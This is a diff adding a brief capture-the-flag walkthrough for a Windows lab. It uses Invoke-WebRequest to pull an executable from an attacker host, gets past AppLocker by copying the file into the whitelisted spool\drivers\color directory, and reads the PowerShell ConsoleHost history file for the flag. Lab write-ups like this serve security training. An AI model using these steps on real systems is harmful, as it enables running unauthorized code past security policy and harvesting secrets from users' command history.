@@ -1,0 +1,31 @@
+Walkthrough
+===========
+
+1. in my attackbox run a simplehttp server
+
+2. in target's powershell:-
+(To transfer our demo exe file into target's system)
+PS C:\Users\dark> $URL = "http://10.18.1.224:9000/ternaryif.exe"
+PS C:\Users\dark> $PATH = "C:\Users\dark\ternaryif.exe"
+PS C:\Users\dark> Invoke-WebRequest -URI $URL -OutFile $PATH
+
+3. now exit from powershell
+
+4. ./ternaryif.exe
+It does not run. Because of Applock policy.
+So we have to bypass it
+
+5. copy the file into 
+C:\Windows\System32\spool\drivers\color 
+
+this directory is whitelisted by default. (A curated list is attached in this repository)
+
+6. now we can be able to run the executable.
+
+7. To access the flag we are instructed to check powershell history(It is named as ConsoleHost History)
+%userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+
+8. type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+(got the flag)
+
+
